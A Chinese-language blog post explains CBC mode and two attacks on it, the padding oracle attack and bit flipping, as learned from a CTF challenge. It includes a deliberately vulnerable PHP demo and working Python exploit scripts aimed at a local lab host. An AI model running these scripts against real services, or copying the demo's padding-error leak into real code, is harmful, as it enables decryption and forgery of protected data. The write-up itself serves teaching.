---
layout: post
title: WEB中的密码学攻击--CBC
tags: [cbc, padding oracle attack, bit flipping attack]
comment: false
---

上学期密码程序设计的时候选的MD5就想到了解好了原理可以去写一篇关于其长度扩展攻击的博客，只是一直拖着没写。这几天打比赛的时候又碰到了跟密码学相关的题目了，密码学方面是真的弱，是时候记录一发了。

## CBC的加密与解密
引用下维基对CBC的描述：
>1976年，IBM发明了密码分组链接（CBC，Cipher-block chaining）。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。

CBC属于分组密码工作模式，所以在加密或是解密之前都会有一个分组的过程。比如：AES-128-CBC，AES-192-CBC，AES-256-CBC则对应分组大小为16，24，32。因为明文不一定刚好够分，往往会出现最后一个分组中字节比分组设定的大小要小的情况，这时候就要进行填充，将最后一个分组填充到设定好的分组大小，这个填充过程到写Padding Oracle Attack再说。接下来做的就是每个分组的明文块分别加密后得到的密文块组合起来就是密文了。解密就是相对应的一个逆向过程。

CBC加密过程：
![cbc_encode](https://ooo.0o0.ooo/2017/03/13/58c66c7a6df8b.png)
使用公式描述：
![cbc_encode](https://ooo.0o0.ooo/2017/03/13/58c66f4632842.jpg)
明文块与上一组密文块进行一次异或再被加密处理成对应的密文，第一组明文的话是与一个初始化向量（IV）进行异或。

CBC解密过程：
![cbc_decode](https://ooo.0o0.ooo/2017/03/13/58c674cdf0c01.png)
使用公式描述：
![cbc_decode](https://ooo.0o0.ooo/2017/03/13/58c6759ae738c.jpg)
就是对应加密的一个逆向过程了，了解好这两个过程对下面说的两个攻击是有很大的帮助的。这里并没有去关注它里面具体的加密/解密的实现哈，因为对要说的两种攻击没影响=。=
这两个过程都会用到的变量：
- IV	初始化向量
- P		明文
- C		密文
- Key	进行具体加密过程需要用的一个变量

## Padding Oracle Attack
这个攻击记得以前拿wvs去扫asp.net站点的时候会看到不少存在这个漏洞的提示，只不过那会不懂得，问了下群里，有人给我说就是攻击Oracle数据库的，哈哈。
实际上这里的Oracle应该理解为“提示”，也就是根据服务器的“提示”（响应）进行相应填充的一个攻击。这个攻击能出现的原因是解密函数在对密文解密后会对填充信息进行校验，要是填充信息不对就会解密失败，解密失败是可能返回错误信息或者服务器直接500。
能达到的一个攻击效果：**在不知道Key的情况下获取明文**。

填充过程在这个攻击中是很重要的。这里只介绍PKCS#5这个常用的填充方式，也就是缺少n个字节就给它填充n个n，例如8个字节分组的：（下面大量盗图开始，下面参考里有连接）
![64bit](https://ooo.0o0.ooo/2017/03/13/58c69052c73b5.jpg)
注意图中的Ex4这里要是刚好满足分组大小的话，会添加一个分组并用相应的n填充满。再来看看有填充的加密和解密过程：
![encode](https://ooo.0o0.ooo/2017/03/13/58c6986d97d92.jpg)
![decode](https://ooo.0o0.ooo/2017/03/13/58c698e140d1a.jpg)
我们就是利用这个会对填充信息进行校验来进行攻击的，还有一点就是CBC是分组加密的，所以也是对应着对一组一组进行攻击。一个攻击过程：
![attack_1](https://ooo.0o0.ooo/2017/03/13/58c69d7e8fdba.jpg)
这里传进去一个密文分组，和全是0的IV进行攻击，解密得到的最后一位为0x3D。填充信息的校验会失败，因为根据上面的填充方式知道，最后一组解密出来是必然带填充信息的，这里要是只有一位填充信息的话，那它肯定得是0x01。
![attack_2](https://ooo.0o0.ooo/2017/03/13/58c6a08f3cbf3.jpg)
![attack_3](https://ooo.0o0.ooo/2017/03/13/58c6a090d951b.jpg)
接下来要做的就是不断增大IV（0x00-0xff），直到填充信息的校验成功。这样我们就可以用0x01和0x3C异或得到中间值的一位0x3D。这里的中间值是由具体解密过程得到的，只要与真实的IV进行异或就可以得到明文了，不清楚的话可以再去看看上面的CBC加解密过程。所以我们想得到明文只要拿到这个中间值就行了。这里还有一种情况就是如果中间值的后两位为0x00和0x02，那么我们传进去的初始向量的后两位为0x02和0x00时也能通过校验，所以一个更好的做法是校验成功时，再去修改IV的前一位看还是不是校验成功，成功的话这一位才是对的。
![attack_4](https://ooo.0o0.ooo/2017/03/13/58c6a55d0475b.jpg)
然后就是测试两位填充信息的情况。先要将IV的最后一位修改，值由0x3D和0x02异或得到。同样将IV的倒数第二位不断增大，直到校验成功得到中间值的倒数第二位。
![attack_5](https://ooo.0o0.ooo/2017/03/13/58c6a55e57883.jpg)
重复上述过程就可以得到完整的中间值，和原来的IV进行异或得到第一个分组的明文。类推，可以得到所有的明文块。
由攻击过程得知这种攻击的两个前提条件：
- 攻击者知道密文和IV
- 攻击者可以通过服务器的相应知道解密的成功与否


## Bit Flipping Attack
比特翻转攻击，可以达到的一个攻击效果：**修改密文解密后的明文**。
这个攻击的原理还是很好理解的。首先要知道C = A xor B的话，那么A，B，C这三者中的任意两个进行异或必然可以得到第三个的值。
假设C为上面提到的中间值，A为初始向量，B为解密后的明文。现在想把明文A给替换成D，那么只要改变A = C xor B就行了，也就是A = A xor B xor D。类推，要是A为其它块密文的话，那么就可以改变下一个块的明文。要注意的一点就是你要是改变的是最后一块的明文长度，要记得把填充信息也进行异或处理。
由攻击过程得知这种攻击的两个前提条件：
- 攻击者知道密文和IV
- 攻击者知道密文解密后的明文（这个可以由上面的那种攻击得到）


## Demo及攻击脚本
写一个小demo：
```php
<?php 
$type = "aes-128-cbc";	//加密类型，即分组大小为16
$P = "I_am_secret!";	//明文
$Key = "aAbBcCdDeE";	//加密要用到的Key
$IV = "aAbBcC2333333333";	//初始化向量，因为有一个异或的过程，所以它的大小和分组大小要一样

$C = openssl_encrypt($P, $type, $Key, OPENSSL_RAW_DATA, $IV);
//满足padding oracle attack前提条件1
print "iv: ".base64_encode($IV)."<br>";
print "c: ".base64_encode($C)."<br>";	//可能存在不可显示的字符，加个base64的编码

if(isset($_GET['s']) && isset($_GET['iv'])){
	$s = base64_decode($_GET['s']);
	$iv = base64_decode($_GET['iv']);
	if(($n = openssl_decrypt($s, $type, $Key, OPENSSL_RAW_DATA, $iv)) !== false){		//解密失败会返回false
		//bit flipping attack
		if($n === "admin"){
			print "well done!";
		}
	}else{
		//满足padding oracle attack前提条件2
		die("Fail!");
	}
}
?>
```
Padding Oracle攻击脚本：
```python
import requests
import base64

url = 'http://hack.lo/cbc_po.php'
N = 16
l = [0] * N
iv = 'YUFiQmNDMjMzMzMzMzMzMw=='.decode('base64')
tmp_iv = ''
out = [0] * N
s = ''

for i in range(1, N+1):
	for c in range(0,256):
		l[N-i] = c
		tmp_iv = ''
		for m in l:
			tmp_iv += chr(m)
		print tmp_iv.encode('hex')
		payload = "?s=CQdsygAk3x07nzfUB5T3Qg%3D%3D&iv=" + base64.b64encode(tmp_iv).replace('=','%3d').replace('/','%2f').replace('+','%2b')
		data = requests.get(url+payload).content
		if 'Fail!' not in data:
			out[N-i] = c ^ i
			for y in range(i):
				l[N-y-1] = out[N-y-1] ^ (i+1)
			break

for i in range(N):
	out[i] = out[i] ^ ord(iv[i])
for c in out:
	s += chr(c)
print s
```
Bit Flipping攻击脚本：
```python
import base64

p = "I_am_secret!"
iv = "YUFiQmNDMjMzMzMzMzMzMw==".decode('base64')
out = ''

out += chr(ord(p[0]) ^ ord(iv[0]) ^ ord('a'))
out += chr(ord(p[1]) ^ ord(iv[1]) ^ ord('d'))
out += chr(ord(p[2]) ^ ord(iv[2]) ^ ord('m'))
out += chr(ord(p[3]) ^ ord(iv[3]) ^ ord('i'))
out += chr(ord(p[4]) ^ ord(iv[4]) ^ ord('n'))
out += chr(ord(p[5]) ^ ord(iv[5]) ^ 11)
out += chr(ord(p[6]) ^ ord(iv[6]) ^ 11)
out += chr(ord(p[7]) ^ ord(iv[7]) ^ 11)
out += chr(ord(p[8]) ^ ord(iv[8]) ^ 11)
out += chr(ord(p[9]) ^ ord(iv[9]) ^ 11)
out += chr(ord(p[10]) ^ ord(iv[10]) ^ 11)
out += chr(ord(p[11]) ^ ord(iv[11]) ^ 11)
out += chr(4 ^ ord(iv[12]) ^ 11)
out += chr(4 ^ ord(iv[13]) ^ 11)
out += chr(4 ^ ord(iv[14]) ^ 11)
out += chr(4 ^ ord(iv[15]) ^ 11)

print base64.b64encode(out)
```

## 后记
比赛时写的脚本并没有对base64编码中的+，/，=进行url编码，导致只能跑出明文的一部分，代码写的烂啊，得好好写代码去。这个demo也是根据比赛时的题目弄得，但它那题目里的if判断中是没有和false进行判断的，明文的第一位会跑不出来，因为全填充16的时候它解密成功结果会是空，这样的话解密失败和解密成功就没区别了。

## 参考
http://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html